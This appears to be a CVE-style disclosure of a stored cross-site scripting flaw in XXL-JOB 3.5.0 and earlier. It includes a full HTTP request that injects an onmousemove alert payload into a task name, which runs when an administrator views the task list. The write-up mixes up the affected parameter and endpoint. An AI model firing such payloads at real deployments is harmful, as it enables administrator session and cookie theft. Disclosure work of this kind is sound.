# In XXL-JOB versions <=3.5.0, the '/jobinfo/insert' interface's `executorHandler` parameter is vulnerable to Cross-Site Scripting (XSS). Normal users can construct strings containing malicious JavaScript code in the name and author parameters. When an administrator views the task management interface, these codes will be executed, potentially leading to the theft of sensitive information (such as cookies).



![image-20260715233455491](https://raw.githubusercontent.com/hhhh333/CVE/7b7a2906fc9108262c17fa33ba5a3bcbea6fa47e/image-20260715233455491.png)

create a regular user account and select the options for the generic executor Sample (xxl-job-executor-sample) and the AI executor Sample (xxl-job-executor-sample-ai)

Log in to a regular user account -> Add task management

Although `XssUtil` performs XSS filtering, it does not perform regular expression matching on event handlers such as `oncopy` and `onmousemove`, resulting in the triggering of XSS vulnerabilities.

![image-20260715234747279](https://raw.githubusercontent.com/hhhh333/CVE/7b7a2906fc9108262c17fa33ba5a3bcbea6fa47e/image-20260715234747279.png)

The `executorHandler` parameter has an XSS vulnerability

![image-20260717152236340](https://github.com/hhhh333/CVE/blob/picture-1/image-20260717152236340.png)

insert path

![image-20260715235633636](https://raw.githubusercontent.com/hhhh333/CVE/7b7a2906fc9108262c17fa33ba5a3bcbea6fa47e/image-20260715235633636.png)

Parameters in the xxljobinfo class

![image-20260717152337416](https://github.com/hhhh333/CVE/blob/picture-1/image-20260717152337416.png)



```
POST /jobinfo/update HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 444
Origin: http://127.0.0.1:8080
Sec-GPC: 1
Connection: keep-alive
Referer: http://127.0.0.1:8080/jobinfo
Cookie: xxl_job_login_token=eyJ1c2VySWQiOiIyIiwiZXhwaXJlVGltZSI6MCwic2lnbmF0dXJlIjoiNWRkOGQ3YjA0MjViNGY0ZTkyOTEyN2EzZTIzMThmMDUifQ
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0

jobGroup=1&name=%22%3E%3Ca+onmousemove%3Dalert(%22XSS%22)%3Exss&author=1&alarmEmail=&scheduleType=CRON&scheduleConf=0%2F1+*+*+*+*+%3F&cronGen_display=0%2F1+*+*+*+*+%3F&schedule_conf_CRON=0%2F1+*+*+*+*+%3F&schedule_conf_FIX_RATE=&schedule_conf_FIX_DELAY=&executorHandler=a111&executorParam=&executorRouteStrategy=FIRST&childJobId=&misfireStrategy=DO_NOTHING&executorBlockStrategy=SERIAL_EXECUTION&executorTimeout=0&executorFailRetryCount=0&id=14
```

![image-20260717152422195](https://github.com/hhhh333/CVE/blob/picture-1/image-20260717152422195.png)

When the administrator views task management, malicious code is executed

![image-20260717152458530](https://github.com/hhhh333/CVE/blob/picture-1/image-20260717152458530.png)

The malicious code is executed successfully.
